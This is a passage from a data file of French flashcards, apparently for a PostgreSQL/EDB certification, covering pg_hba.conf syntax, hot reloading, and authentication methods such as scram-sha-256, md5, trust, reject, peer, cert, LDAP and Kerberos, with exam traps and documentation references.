      question: 'Que signifient les mots-clés spéciaux `all`, `sameuser` et `replication` dans la colonne `DATABASE` de `pg_hba.conf` ?',
      codeSnippet: 'local   sameuser     all                       peer\nhost    replication  rep_user  192.168.1.0/24  scram-sha-256',
      hint: 'Ces mots-clés permettent des filtres dynamiques basés sur le nom de l\'utilisateur ou le type de flux.',
    },
    back: {
      answer: '1. `all` : Concerne TOUTES les bases de données du cluster (à l\'exception exclusive du pseudo-service `replication`).\n2. `sameuser` : La connexion n\'est acceptée que si l\'utilisateur demandé porte exactement le même nom que la base de données ciblée (ex: l\'utilisateur `alice` se connecte à la base `alice`).\n3. `samerole` : L\'utilisateur connecté doit être directement membre d\'un rôle portant le même nom que la base de données.\n4. `replication` : Ne désigne PAS une base de données physique, mais la connexion de streaming WAL de réplication physique/logique (ex: `pg_basebackup` ou processus WAL Receiver).',
      explanation: 'Pour spécifier plusieurs bases distinctes, on les sépare par une virgule sans espace (ex: `compta,rh,finance`).',
      examTrap: 'Le mot-clé `all` ne couvre JAMAIS les connexions `replication` ! Une ligne dédiée avec `replication` dans la colonne DATABASE est obligatoire pour répliquer.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.1: The pg_hba.conf File',
    },
  },
  {
    id: 'fc-pgedb-dom03-036',
    cardNumber: 36,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Ciblage de groupes d\'utilisateurs avec le préfixe `+`',
    difficulty: 'easy',
    tags: ['+group', 'USER Column', 'Role Inheritance', 'pg_hba.conf'],
    front: {
      question: 'Comment autoriser dans `pg_hba.conf` tous les utilisateurs appartenant à un rôle de groupe donné sans devoir lister chaque utilisateur individuellement ?',
      codeSnippet: 'host    app_db    +developpeurs    10.0.1.0/24    scram-sha-256',
      hint: 'Un symbole préfixe placé devant le nom du rôle indique qu\'il s\'agit d\'un groupe.',
    },
    back: {
      answer: 'On préfixe le nom du groupe par le caractère `+` (plus) dans la colonne `USER` :\n```text\nhost    app_db    +developpeurs    10.0.1.0/24    scram-sha-256\n```\nFonctionnement :\n- PostgreSQL vérifie si l\'utilisateur qui se connecte est membre (direct ou indirect par héritage) du rôle `developpeurs`.\n- Si oui, la règle s\'applique.\n- Permet d\'ajouter de nouveaux membres dans PostgreSQL en SQL (`GRANT developpeurs TO new_dev;`) sans jamais avoir besoin d\'éditer `pg_hba.conf` ni de recharger la configuration du serveur !',
      explanation: 'Ce mécanisme est la meilleure pratique d\'architecture pour gérer les accès des équipes de manière centralisée.',
      examTrap: 'Oublier le `+` fait que la règle ne s\'applique qu\'au rôle `developpeurs` lui-même (qui souvent a l\'attribut `NOLOGIN` et ne peut donc pas se connecter).',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.1: The pg_hba.conf File',
    },
  },
  {
    id: 'fc-pgedb-dom03-037',
    cardNumber: 37,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Format des adresses réseau : CIDR, masques et alias (`samehost`, `samenet`)',
    difficulty: 'medium',
    tags: ['CIDR', 'samehost', 'samenet', 'Networking', 'ADDRESS Column'],
    front: {
      question: 'Quels sont les formats acceptés pour la colonne `ADDRESS` dans `pg_hba.conf` et que désignent les alias `samehost` et `samenet` ?',
      codeSnippet: 'host    all   all   192.168.1.100/32    scram-sha-256\nhost    all   all   samehost            scram-sha-256\nhost    all   all   samenet             scram-sha-256',
      hint: 'Notation CIDR avec préfixe de masque, ou mots-clés automatiques calqués sur les interfaces réseau du serveur.',
    },
    back: {
      answer: 'Formats d\'adresses valides dans `pg_hba.conf` :\n1. Notation CIDR IPv4 / IPv6 : `192.168.1.0/24`, `10.0.0.5/32`, `2001:db8::/32`, `::1/128`.\n2. Notation IP + Masque séparé par un espace : `192.168.1.0 255.255.255.0`.\n3. Mot-clé `all` : Correspond à n\'importe quelle adresse IP source (équivalent à `0.0.0.0/0` et `::/0`).\n4. Alias dynamiques :\n   - `samehost` : Correspond à n\'importe quelle adresse IP configurée sur la machine locale hébergeant le serveur.\n   - `samenet` : Correspond à n\'importe quelle adresse IP appartenant au sous-réseau local auquel le serveur est directement raccordé.',
      explanation: 'La notation CIDR avec `/32` (hôte unique) ou `/24` (sous-réseau de 256 adresses) est la recommandation moderne standard.',
      examTrap: 'Si vous écrivez `192.168.1.50` sans préciser `/32`, la syntaxe est rejetée comme invalide dans les versions récentes de PostgreSQL.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.1: The pg_hba.conf File',
    },
  },
  {
    id: 'fc-pgedb-dom03-038',
    cardNumber: 38,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Rechargement de `pg_hba.conf` à chaud sans interruption',
    difficulty: 'easy',
    tags: ['SIGHUP', 'pg_reload_conf', 'Zero Downtime', 'Reload'],
    front: {
      question: 'Comment appliquer de nouvelles règles configurées dans `pg_hba.conf` sans interrompre le service ni déconnecter les utilisateurs existants ?',
      hint: 'Le fichier est relu à chaud lors de la réception d\'un signal SIGHUP.',
    },
    back: {
      answer: 'Le fichier `pg_hba.conf` est de contexte `sighup`.\nPour appliquer les modifications sans aucune coupure de service :\n1. En ligne de commande OS : `pg_ctl reload -D $PGDATA` ou `systemctl reload postgresql-16`.\n2. En session SQL (par un administrateur) : `SELECT pg_reload_conf();`.\n\nEffets :\n- Le serveur relit immédiatement le fichier.\n- Les sessions actives en cours ne sont PAS interrompues.\n- Toutes les nouvelles connexions initiées après le rechargement sont soumises aux nouvelles règles.',
      explanation: 'C\'est l\'un des atouts majeurs de PostgreSQL pour l\'administration 24/7 en haute disponibilité.',
      examTrap: 'Si `pg_hba.conf` comporte une faute de frappe ou une erreur de syntaxe lors du rechargement, le serveur consigne une erreur dans ses logs et CONTINUE de fonctionner avec la version précédente valide en mémoire !',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.1: The pg_hba.conf File',
    },
  },
  {
    id: 'fc-pgedb-dom03-039',
    cardNumber: 39,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Audit et diagnostic de syntaxe avec `pg_hba_file_rules`',
    difficulty: 'medium',
    tags: ['pg_hba_file_rules', 'Troubleshooting', 'System Views', 'Audit'],
    front: {
      question: 'Quelle vue système permet de vérifier directement en SQL si le fichier `pg_hba.conf` a été analysé sans erreur par le serveur ?',
      codeSnippet: 'SELECT line_number, type, database, user_name, address, auth_method, error\nFROM pg_hba_file_rules\nWHERE error IS NOT NULL;',
      hint: 'La vue système pg_hba_file_rules détaille chaque ligne du fichier et remplit la colonne error en cas d\'anomalie.',
    },
    back: {
      answer: 'La vue système est `pg_hba_file_rules`.\nUtilité fondamentale :\n- Elle reflète exactement la vision que le serveur a du fichier `pg_hba.conf` actif.\n- Colonnes clés : `line_number`, `type`, `database`, `user_name`, `address`, `netmask`, `auth_method`, `options`, `error`.\n- Si la colonne `error` est non-nulle (`WHERE error IS NOT NULL`), elle contient le message explicatif de la syntaxe invalide (ex: adresse CIDR mal formée, méthode inexistante).\n\nPermet au DBA de valider l\'intégrité de la configuration sans aller inspecter manuellement les logs du serveur.',
      explanation: 'Elle permet aussi de diagnostiquer les règles qui ne correspondent pas à ce que le DBA pensait avoir écrit.',
      examTrap: 'Si `error IS NOT NULL`, la ligne fautive est totalement ignorée par le moteur lors des tentatives d\'authentification !',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 54: System Views - pg_hba_file_rules',
    },
  },
  {
    id: 'fc-pgedb-dom03-040',
    cardNumber: 40,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Fichiers secondaires inclus avec le préfixe `@`',
    difficulty: 'hard',
    tags: ['@filename', 'File Inclusion', 'Modular Architecture', 'Scalability'],
    front: {
      question: 'Que permet la syntaxe `@nom_fichier` dans les colonnes `DATABASE` ou `USER` de `pg_hba.conf` ?',
      codeSnippet: 'host    all    @/etc/postgresql/authorized_users.txt    10.0.0.0/8    scram-sha-256',
      hint: 'Elle permet de déporter une longue liste de noms d\'utilisateurs ou de bases de données dans un fichier texte externe séparé.',
    },
    back: {
      answer: 'Le préfixe `@` (arobase) suivi d\'un chemin de fichier permet d\'inclure une liste externe d\'utilisateurs ou de bases de données :\n- Le fichier pointé contient un ou plusieurs noms par ligne (ou séparés par des espaces).\n- Si le chemin est relatif, il est résolu par rapport au répertoire contenant `pg_hba.conf`.\n- Cas d\'usage : Permet à des équipes de déploiement automatisé (Ansible, Puppet) de mettre à jour la liste des utilisateurs autorisés dans un fichier texte dédié sans modifier le fichier principal `pg_hba.conf`.\n\nAprès modification du fichier inclus, un simple `SELECT pg_reload_conf();` relit l\'ensemble.',
      explanation: 'Ce mécanisme apporte une grande propreté architecturale dans les environnements d\'entreprise complexes.',
      examTrap: 'Si le fichier pointé après `@` est introuvable ou illisible pour l\'utilisateur OS `postgres`, le rechargement de la configuration échoue avec une erreur critique.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.1: The pg_hba.conf File',
    },
  },

  // =========================================================================
  // SECTION 5 : MÉTHODES D'AUTHENTIFICATION DANS `pg_hba.conf` (Cartes 41 à 50)
  // scram-sha-256, md5, password, trust, reject, peer, cert, ident, ldap
  // =========================================================================
  {
    id: 'fc-pgedb-dom03-041',
    cardNumber: 41,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Méthode d\'authentification standard : `scram-sha-256`',
    difficulty: 'easy',
    tags: ['scram-sha-256', 'SCRAM', 'Modern Security', 'RFC 5802', 'Best Practice'],
    front: {
      question: 'Pourquoi la méthode `scram-sha-256` est-elle le standard absolu d\'authentification par mot de passe sous PostgreSQL ?',
      codeSnippet: 'host    all    all    0.0.0.0/0    scram-sha-256',
      hint: 'Salted Challenge Response Authentication Mechanism : le mot de passe ne transite jamais sur le réseau et est protégé contre le spoofing.',
    },
    back: {
      answer: '`scram-sha-256` (RFC 5802/7677) est la méthode d\'authentification par mot de passe la plus sécurisée de PostgreSQL :\n1. Le mot de passe réel ne transite JAMAIS sur le réseau (ni en clair, ni sous forme de simple hash statique).\n2. Protocole de challenge-réponse cryptographique salé : le client et le serveur se prouvent mutuellement qu\'ils connaissent le secret sans le révéler.\n3. Immunisé contre les attaques par écoute réseau (sniffing), le rejeu (replay attacks) et les faux serveurs (rogue server authentication).\n4. Dans `pg_authid`, le mot de passe est stocké avec un sel cryptographique fort et 4096 itérations de hachage SHA-256.',
      explanation: 'C\'est la méthode activée par défaut depuis PostgreSQL 14 via le paramètre `password_encryption = \'scram-sha-256\'`.',
      examTrap: 'Si le mot de passe d\'un utilisateur a été créé sous l\'ancienne méthode MD5, il ne pourra pas se connecter via une règle `scram-sha-256` tant que son mot de passe n\'a pas été réinitialisé !',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.3.1: Password Authentication (SCRAM-SHA-256)',
    },
  },
  {
    id: 'fc-pgedb-dom03-042',
    cardNumber: 42,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Méthode obsolète `md5` et migration',
    difficulty: 'medium',
    tags: ['md5', 'Legacy', 'Vulnerabilities', 'Migration'],
    front: {
      question: 'Pourquoi la méthode d\'authentification `md5` est-elle considérée comme obsolète et déconseillée dans les environnements d\'entreprise ?',
      codeSnippet: 'host    all    all    10.0.0.0/8    md5',
      hint: 'L\'algorithme MD5 présente des faiblesses cryptographiques et le stockage du hash dans pg_authid est vulnérable.',
    },
    back: {
      answer: 'Inconvénients et risques de `md5` sous PostgreSQL :\n1. L\'algorithme MD5 souffre de collisions cryptographiques connues.\n2. Le hash stocké dans `pg_authid` (`md5` + md5(password + username)) utilise simplement le nom d\'utilisateur comme sel statique, le rendant vulnérable aux tables de hachage pré-calculées (Rainbow Tables).\n3. Rejeté par la majorité des référentiels de conformité de sécurité (PCI-DSS, FIPS, ISO 27001).\n\nMigration vers `scram-sha-256` :\n1. Définir `password_encryption = \'scram-sha-256\'` dans `postgresql.conf`.\n2. Réinitialiser les mots de passe de tous les rôles (`ALTER ROLE usr WITH PASSWORD \'...\'`).\n3. Remplacer `md5` par `scram-sha-256` dans `pg_hba.conf` et recharger.',
      explanation: 'Pour compatibilité, PostgreSQL accepte qu\'une règle déclarée `md5` dans `pg_hba.conf` authentifie un mot de passe haché en SCRAM si le client le supporte.',
      examTrap: 'Sous les versions récentes de PostgreSQL et EPAS en mode FIPS, la méthode `md5` est purement et simplement désactivée au niveau binaire.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.3.1: Password Authentication (MD5)',
    },
  },
  {
    id: 'fc-pgedb-dom03-043',
    cardNumber: 43,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Dangers extrêmes de la méthode `password` (en clair)',
    difficulty: 'easy',
    tags: ['password', 'Security Flaw', 'Cleartext', 'Anti-Pattern'],
    front: {
      question: 'Que réalise la méthode d\'authentification `password` dans `pg_hba.conf` et pourquoi est-elle strictement bannie en production ?',
      codeSnippet: 'host    all    all    0.0.0.0/0    password  -- DANGER MAJEUR !',
      hint: 'Elle transmet le mot de passe en clair pur sur le réseau sans aucun hachage.',
    },
    back: {
      answer: 'La méthode `password` demande au client de saisir son mot de passe et l\'expédie **EN CLAIR PUR** à travers les paquets du réseau vers le serveur !\n\nDangers majeurs :\n- N\'importe quel équipement réseau intermédiaire ou analyseur de paquets (Wireshark, tcpdump, commutateur compromis) peut intercepter le mot de passe sans aucun effort de déchiffrement.\n- Elle ne doit JAMAIS être employée sur un réseau non chiffré.\n- Si elle doit impérativement être utilisée avec des clients historiques non compatibles SCRAM, elle doit obligatoirement être confinée sous une directive `hostssl` pour bénéficier du tunnel TLS.',
      explanation: 'C\'est une faille de sécurité classique d\'administrateurs novices confondant le mot-clé de méthode `password` avec un système sécurisé.',
      examTrap: 'Sur l\'examen, toute proposition suggérant d\'utiliser la méthode `password` pour sécuriser des accès distants doit être considérée comme une mauvaise réponse.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.3.1: Password Authentication',
    },
  },
  {
    id: 'fc-pgedb-dom03-044',
    cardNumber: 44,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Méthode `trust` : utilisation légitime et risques de dérive',
    difficulty: 'medium',
    tags: ['trust', 'No Authentication', 'Loopback', 'Localhost'],
    front: {
      question: 'Quel est le comportement de la méthode `trust` et dans quel unique cas d\'usage est-elle tolérée ?',
      codeSnippet: 'host    all    all    0.0.0.0/0    trust  -- INTERDIT EN PROD !\nlocal   all    postgres            trust  -- Maintenance locale',
      hint: 'Elle admet inconditionnellement la connexion sans demander le moindre mot de passe ni vérifier l\'identité.',
    },
    back: {
      answer: 'La méthode `trust` accorde une confiance aveugle au client :\n- Le serveur PostgreSQL connecte le client immédiatement sans demander aucun mot de passe ni effectuer aucune vérification d\'identité.\n- N\'importe quel utilisateur distant peut usurper le rôle de son choix (y compris `postgres` superuser) simplement en précisant `-U postgres` !\n\nCas d\'usage légitimes très restreints :\n1. Initialisation d\'un cluster local fermé pour la première configuration.\n2. Procédure de secours d\'urgence (Disaster Recovery) sur console locale via socket Unix (`local ... trust`) en cas de perte du mot de passe superutilisateur.\n3. Conteneurs de tests éphémères automatisés (CI/CD) isolés sans exposition réseau.',
      explanation: 'Appliquer `trust` sur une interface réseau `host` (même en réseau interne d\'entreprise) représente une faille critique de niveau maximal.',
      examTrap: 'Si `trust` est configuré sur `localhost`, n\'importe quel utilisateur disposant d\'un compte shell sur la machine locale peut devenir superutilisateur de la base.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.3.2: Trust Authentication',
    },
  },
  {
    id: 'fc-pgedb-dom03-045',
    cardNumber: 45,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Méthode de rejet explicite : `reject`',
    difficulty: 'medium',
    tags: ['reject', 'Blocklist', 'Security Hardening', 'Defense in Depth'],
    front: {
      question: 'À quoi sert la méthode d\'authentification `reject` dans `pg_hba.conf` sachant que le serveur rejette déjà les connexions sans correspondance ?',
      codeSnippet: '# Interdire formellement le superutilisateur depuis le réseau :\nhost    all    postgres    0.0.0.0/0       reject\n# Bloquer un sous-réseau spécifique suspect :\nhost    all    all         192.168.5.0/24  reject',
      hint: 'Elle permet de bloquer explicitement des cas précis avant qu\'une règle générique permissive plus bas ne les autorise.',
    },
    back: {
      answer: 'La méthode `reject` force le rejet immédiat et inconditionnel de la tentative de connexion concordante.\nCas d\'usage vitaux combinés avec la règle du First-Match :\n1. **Bannir l\'accès distant du superutilisateur** : En plaçant `host all postgres 0.0.0.0/0 reject` tout en haut du fichier, on garantit que personne ne pourra jamais se connecter en `postgres` via TCP/IP, même si une règle permissive `host all all 0.0.0.0/0 scram-sha-256` est présente plus bas.\n2. **Blacklistage réseau ciblé** : Bloquer une machine ou une plage d\'adresses IP compromise au sein d\'un réseau d\'entreprise autorisé.\n3. Messages d\'erreur clairs et immédiats pour les tentatives frauduleuses.',
      explanation: 'C\'est l\'outil de base de la défense en profondeur pour segmenter les profils d\'administration.',
      examTrap: 'Ne placez pas une règle `reject` générale tout en haut sans cibler d\'utilisateur ou d\'IP, sinon personne ne pourra se connecter.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.3.3: Password Authentication / Reject',
    },
  },
  {
    id: 'fc-pgedb-dom03-046',
    cardNumber: 46,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Authentification système OS locale : méthode `peer`',
    difficulty: 'medium',
    tags: ['peer', 'OS User', 'getpeereid', 'Unix Sockets'],
    front: {
      question: 'Comment fonctionne la méthode d\'authentification `peer` et pourquoi ne s\'applique-t-elle qu\'au type de connexion `local` ?',
      codeSnippet: 'local   all   all   peer',
      hint: 'Elle demande au noyau Linux l\'identité du compte système OS qui a ouvert la socket Unix.',
    },
    back: {
      answer: 'La méthode `peer` fonctionne exclusivement sur les sockets de domaine Unix locaux (`local`) :\n1. Lorsque le client lance `psql`, PostgreSQL interroge le noyau du système d\'exploitation (via l\'appel système `getpeereid()`) pour obtenir le nom d\'utilisateur OS réel qui a initié le processus.\n2. Le serveur compare ce nom d\'utilisateur OS au nom du rôle PostgreSQL demandé.\n3. Si le nom d\'utilisateur système OS correspond exactement au nom du rôle PostgreSQL (ex: vous êtes logué en tant que `postgres` sous Linux et vous demandez `-U postgres`), la connexion est acceptée sans mot de passe.\n4. Si les noms diffèrent, la connexion est immédiatement refusée.',
      explanation: 'C\'est la méthode par défaut sous Debian/Ubuntu pour le compte d\'administration `postgres` (`sudo -u postgres psql`).',
      examTrap: 'La méthode `peer` est physiquement IMPOSSIBLE sur les connexions réseau TCP/IP (`host`), car le protocole réseau ne transmet pas de façon sûre le PID du processus client.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.3.4: Peer Authentication',
    },
  },
  {
    id: 'fc-pgedb-dom03-047',
    cardNumber: 47,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Mise en correspondance des identités avec `pg_ident.conf` (Mapping)',
    difficulty: 'hard',
    tags: ['pg_ident.conf', 'User Mapping', 'map option', 'peer / cert'],
    front: {
      question: 'Comment autoriser l\'utilisateur système Linux `ubuntu` à se connecter en tant que rôle PostgreSQL `postgres` via la méthode `peer` ?',
      codeSnippet: '# pg_hba.conf:\nlocal   all   postgres   peer   map=admin_map\n\n# Dans quel autre fichier et comment définit-on admin_map ?',
      hint: 'On utilise le fichier pg_ident.conf pour faire le pont entre un compte OS et un rôle de base de données.',
    },
    back: {
      answer: 'On configure le fichier `$PGDATA/pg_ident.conf` (User Name Mapping) :\n\n1. Dans `pg_ident.conf`, on ajoute la correspondance :\n   ```text\n   # MAPNAME       SYSTEM-USERNAME         PG-USERNAME\n   admin_map       ubuntu                  postgres\n   admin_map       root                    postgres\n   ```\n2. Dans `pg_hba.conf`, on référence ce mapping avec l\'option `map=admin_map` :\n   ```text\n   local   all   postgres   peer   map=admin_map\n   ```\n3. On recharge la configuration (`SELECT pg_reload_conf();`).\n\nDésormais, l\'utilisateur OS `ubuntu` peut exécuter directement `psql -U postgres` sans mot de passe.',
      explanation: 'Ce fichier `pg_ident.conf` sert également pour mapper les Common Names (CN) de certificats clients SSL vers des rôles PostgreSQL.',
      examTrap: 'Le nom de la map (`admin_map`) dans `pg_hba.conf` doit concorder fidèlement avec la première colonne de `pg_ident.conf`.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.2: User Name Maps',
    },
  },
  {
    id: 'fc-pgedb-dom03-048',
    cardNumber: 48,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Authentification mutuelle par certificat client x509 : méthode `cert`',
    difficulty: 'hard',
    tags: ['cert', 'mTLS', 'x509', 'Certificates', 'Zero Trust'],
    front: {
      question: 'Comment fonctionne la méthode d\'authentification `cert` et quels sont les prérequis obligatoires côté serveur et client ?',
      codeSnippet: 'hostssl    all    all    0.0.0.0/0    cert   clientcert=verify-full',
      hint: 'L\'identité du client est validée par sa clé privée et son certificat signé par l\'autorité de certification (CA) du serveur.',
    },
    back: {
      answer: 'La méthode `cert` repose sur l\'authentification mutuelle TLS (mTLS) sans mot de passe :\n\nFonctionnement :\n1. Exige obligatoirement une directive de type `hostssl`.\n2. Le client fournit un certificat public x509 (`~/.postgresql/postgresql.crt`) et sa clé privée.\n3. Le serveur PostgreSQL valide la signature du certificat client à l\'aide de son autorité de certification configurée via `ssl_ca_file` dans `postgresql.conf`.\n4. Par défaut, le Common Name (CN) du certificat client doit correspondre exactement au nom du rôle PostgreSQL demandé (ou être traduit via `pg_ident.conf` avec `map=...`).\n5. Option `clientcert=verify-full` : vérifie la chaîne de certification et s\'assure de l\'identité.',
      explanation: 'C\'est la méthode de sécurité la plus robuste pour interconnecter des microservices ou des serveurs d\'application sans exposer de mots de passe.',
      examTrap: 'Si le serveur n\'a pas configuré `ssl_ca_file`, la méthode `cert` échouera systématiquement car le serveur ne peut pas authentifier les certificats émis.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.3.9: Certificate Authentication',
    },
  },
  {
    id: 'fc-pgedb-dom03-049',
    cardNumber: 49,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Authentification centralisée d\'entreprise : `ldap` et `gss` (Kerberos)',
    difficulty: 'hard',
    tags: ['ldap', 'Active Directory', 'Kerberos', 'GSSAPI', 'Enterprise Security'],
    front: {
      question: 'Comment PostgreSQL s\'intègre-t-il avec les annuaires d\'entreprise (Active Directory / OpenLDAP) et les systèmes Kerberos ?',
      codeSnippet: 'host   all   all   10.0.0.0/8   ldap ldapserver="ad.corp.local" ldapprefix="sAMAccountName=" ldapsuffix="@corp.local"\nhost   all   all   10.0.0.0/8   gss include_realm=0 krb_realm="CORP.LOCAL"',
      hint: 'Grâce aux méthodes natives ldap et gss (GSSAPI/Kerberos) configurables directement dans pg_hba.conf.',
    },
    back: {
      answer: 'PostgreSQL intègre des méthodes d\'authentification d\'entreprise transparentes :\n1. Méthode `ldap` :\n   - Le serveur délègue la vérification du mot de passe à un annuaire LDAP/Active Directory.\n   - Le rôle doit exister dans la base PostgreSQL, mais son mot de passe est validé par bind LDAP.\n2. Méthode `gss` (GSSAPI / Kerberos) :\n   - Permet le Single Sign-On (SSO) transparent en environnement d\'entreprise Windows ou Linux.\n   - L\'utilisateur s\'authentifie avec son ticket Kerberos (ex: `kinit`) sans aucune saisie de mot de passe lors du `psql`.',
      explanation: 'Bien que l\'authentification soit déléguée à l\'annuaire, l\'autorisation (droits sur les tables, schémas) reste strictement gérée par les rôles internes de PostgreSQL.',
      examTrap: 'L\'utilisateur DOIT impérativement avoir été créé au préalable dans PostgreSQL (`CREATE ROLE`), même s\'il existe dans l\'Active Directory (sauf utilisation de modules externes d\'auto-provisionnement).',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 21.3: LDAP and GSSAPI Authentication',
    },
  },
  {
    id: 'fc-pgedb-dom03-050',
    cardNumber: 50,
    domainId: 'pg-edb-dom-03',
    domainCode: 'DOM-03',
    domainTitle: 'Sécurité, Rôles, Authentification pg_hba.conf & Droits',
    subtopic: 'Paramètre `password_encryption` et cycle de hachage',
    difficulty: 'easy',
    tags: ['password_encryption', 'scram-sha-256', 'md5', 'Configuration'],
    front: {
      question: 'À quel moment intervient le paramètre `password_encryption` défini dans `postgresql.conf` et quelles sont ses valeurs autorisées ?',
      codeSnippet: 'password_encryption = \'scram-sha-256\'',
      hint: 'Il détermine l\'algorithme de hachage appliqué lors de l\'exécution des commandes CREATE ROLE et ALTER ROLE avec mot de passe.',
    },
    back: {
      answer: 'Le paramètre `password_encryption` (contexte `user`) détermine la formule de hachage utilisée lorsque vous attribuez un mot de passe à un rôle via `PASSWORD \'secret\'` :\n\nValeurs possibles :\n- `scram-sha-256` (défaut depuis PG 14) : Génère un hash commençant par `SCRAM-SHA-256$...` avec sel et itérations dans `pg_authid`.\n- `md5` : Génère un hash préfixé par `md5...`.\n\nImpact crucial :\nCe paramètre n\'a d\'effet qu\'AU MOMENT de la création ou modification du mot de passe. Changer la valeur de `password_encryption` ne re-hache PAS rétroactivement les mots de passe existants dans la table `pg_authid` !',
      explanation: 'Pour convertir les anciens utilisateurs lors du passage à `scram-sha-256`, il faut ré-exécuter `ALTER ROLE nom WITH PASSWORD \'...\'` pour chacun d\'eux.',
      examTrap: 'Modifier `password_encryption = \'scram-sha-256\'` n\'altère pas les hash MD5 déjà stockés. Les utilisateurs conservent leur ancien hash jusqu\'à réinitialisation.',
      ruleRef: 'PostgreSQL 16 Documentation - Chapter 19.9.1: Authentication Parameters',
    },
  },
];
